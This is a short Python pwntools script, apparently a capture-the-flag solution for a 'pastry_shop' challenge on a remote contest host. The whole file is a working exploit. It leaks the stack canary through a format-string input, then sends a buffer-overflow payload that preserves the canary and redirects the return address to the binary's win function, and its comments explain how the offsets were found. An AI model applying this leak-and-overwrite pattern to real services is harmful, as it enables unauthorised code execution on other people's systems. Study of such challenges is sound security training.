#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./pastry_shop', checksec=False)

#canary is the 23rd element that gets printed from the stack when using %p... as name
CANARY_IDX = 23
#python3 -c "from pwn import *; print(cyclic(200)) + debug to find value that overwrites canary
OFFSET_TO_CANARY = 72
#offset to canary + canary (8B) + saved RPB (8B)
#or padding to canary + canary + cyclic as input, then debug to see what value overwrites RIP
OFFSET_TO_RIP = 88

p = remote("offsec.m0lecon.it", 13588)

p.recvuntil(b'dear customer?\n')
#gets canary for this execution
p.sendline(f"%{CANARY_IDX}$lx".encode())
leak = p.recvline().strip()
canary = int(leak, 16)
log.info(f"canary = {canary:#x}")

p.recvuntil(b'to order?\n')
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(elf.sym.win),
)
p.send(payload)
p.interactive()
